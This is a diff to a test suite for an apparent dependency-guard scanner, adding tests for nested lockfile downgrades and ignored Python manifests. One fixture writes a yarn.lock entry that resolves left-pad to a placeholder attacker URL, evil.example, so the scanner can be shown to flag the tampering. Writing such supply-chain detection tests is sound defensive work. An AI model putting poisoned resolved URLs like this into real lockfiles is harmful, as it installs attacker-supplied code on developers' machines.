@@ -447,6 +447,36 @@ describe('a frontend and backend layout with nothing at the root', () => {
   });
 });
 
+describe('an unread lockfile beside a read one is judged in its own directory', () => {
+  test('editing apps/web/yarn.lock beside a read apps/web/package-lock.json is a downgrade', async () => {
+    await write('package.json', manifestJson({}));
+    await write('apps/web/package.json', manifestJson({ 'left-pad': '^1.0.0' }));
+    await write('apps/web/package-lock.json', npmLock({ 'node_modules/left-pad': CLEAN }));
+    await write('apps/web/yarn.lock', '# yarn lockfile v1\n');
+    await commitAll('base');
+    await git('tag', 'base');
+    await write('apps/web/yarn.lock', '# yarn lockfile v1\n\nleft-pad@^1.0.0:\n  resolved "https://evil.example/left-pad.tgz"\n');
+
+    await expect(
+      scan({ repoRoot: repo, mode: { kind: 'base', ref: 'base' }, corpusDir: FIXTURE_CORPUS })
+    ).rejects.toMatchObject({ code: 'lockfile-downgrade' });
+  });
+});
+
+describe('an ignored Python manifest that parses is still read', () => {
+  test('its dependencies are in the state and no not-parsed note is printed', async () => {
+    await write('.dep-guard.json', JSON.stringify({ ignorePaths: ['backend'] }));
+    await write('package.json', manifestJson({}));
+    await write('backend/requirements.txt', 'requests==2.31.0\n');
+
+    const result = await scan({ repoRoot: repo, mode: { kind: 'audit' }, corpusDir: FIXTURE_CORPUS });
+    const states = await loadStates(repo, { kind: 'audit' });
+
+    expect(result.run.diagnostics.find((entry) => entry.message.includes('backend/requirements.txt'))).toBeUndefined();
+    expect(states.after.manifests.map((entry) => entry.path)).toContain('backend/requirements.txt');
+  });
+});
+
 describe('a root lockfile does not stand in for a deleted nested one', () => {
   test('deleting apps/web/package-lock.json beside a root lockfile with entries is still a downgrade', async () => {
     await write('package.json', manifestJson({ 'left-pad': '^1.0.0' }));
